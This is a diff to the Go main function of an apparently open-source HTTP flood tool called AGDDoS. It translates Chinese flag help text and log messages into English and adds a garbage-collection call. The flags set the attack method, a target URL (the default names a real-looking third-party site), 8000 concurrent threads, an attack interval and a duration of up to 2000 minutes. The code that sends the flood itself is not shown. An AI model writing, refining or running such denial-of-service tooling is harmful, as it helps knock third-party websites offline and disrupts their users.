@@ -4,6 +4,7 @@ import (
 	"flag"
 	"log"
 	"os"
+	"runtime"
 	"time"
 )
 
@@ -13,17 +14,18 @@ var (
 	version   = "unknown"
 )
 
-// Main Function
+// Main Function / 主函数
 func main() {
 	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
 	printWelcome()
 	SetupCloseHandler()
+	runtime.GC() // Clean up memory to prevent memory overflow
 	// Parse Flags / 解析命令行参数
 	printVersion := flag.Bool("v", false, "Print version and exit")
 	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/PUT/HEAD/...)")
 	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
-	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
-	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行攻击的频率(ms)")
+	flag.IntVar(&ConcurrencyCount, "cc", 8000, "Number of concurrent threads")
+	flag.IntVar(&IntervalMillisecond, "ims", 100, "Frequency of attacks per thread(ms)")
 	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
 	flag.Parse()
 
@@ -33,7 +35,7 @@ func main() {
 	}
 
 	if TargetUrl == defaultTargetUrl {
-		log.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
+		log.Printf("TargetUrl is %s. Please try to start by retransmitting parameters from the command line (TargetUrl != defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
 		return
 	}
 	go func() {
